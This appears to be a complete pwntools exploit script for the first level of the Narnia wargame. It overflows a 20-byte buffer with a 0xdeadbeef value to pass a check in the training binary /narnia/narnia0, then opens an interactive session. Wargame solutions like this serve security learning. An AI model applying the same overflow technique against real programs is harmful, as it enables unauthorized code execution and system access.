from pwn import *
elf = context.binary = ELF('/narnia/narnia0')
p = process()

payload = flat(
    "A"*20,
    "\xef\xbe\xad\xde"
)

p.sendline(payload)
print(p.clean().decode('latin-1'))
p.interactive()